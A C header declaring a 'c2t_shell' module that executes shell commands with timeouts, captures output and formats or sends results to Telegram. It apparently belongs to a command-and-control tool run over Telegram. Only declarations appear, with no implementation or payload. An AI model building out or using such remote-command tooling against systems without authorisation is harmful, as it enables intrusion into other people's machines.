/*
 * Copyright (C) 2026 roothunter
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>.
 */

#ifndef C2T_SHELL_H
#define C2T_SHELL_H

#include <stddef.h>
#include <stdint.h>

#define C2T_SHELL_DEFAULT_TIMEOUT_MS 30000U
#define C2T_SHELL_MAX_OUTPUT_BYTES (1024U * 1024U)

typedef struct {
  int exit_code;
  int timed_out;
  int execution_error;
  char *output;
  size_t output_len;
  uint64_t duration_ms;
} c2t_shell_result_t;

[[nodiscard]] int c2t_shell_execute(const char *command,
                                    c2t_shell_result_t *result,
                                    uint32_t timeout_ms);

void c2t_shell_result_free(c2t_shell_result_t *result);

[[nodiscard]] int c2t_shell_format_telegram(const char *command,
                                            const c2t_shell_result_t *result,
                                            char *output, size_t capacity);

[[nodiscard]] int c2t_shell_run_and_send(const char *command);

#endif
